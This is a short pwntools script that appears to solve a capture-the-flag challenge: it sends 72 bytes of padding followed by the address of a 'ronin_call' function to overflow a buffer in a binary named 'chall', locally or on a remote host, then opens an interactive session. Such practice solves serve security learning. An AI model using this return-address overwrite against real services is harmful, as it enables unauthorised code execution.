from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
context.arch = "amd64"

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 1337)

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

def main():
    p = start()

    offset = 72
    payload = flat(
        b"A" * offset,
        elf.symbols["ronin_call"]
    )

    p.sendafter(b"Speak your oath, wanderer:\n", payload)
    p.interactive()

if __name__ == "__main__":
    main()
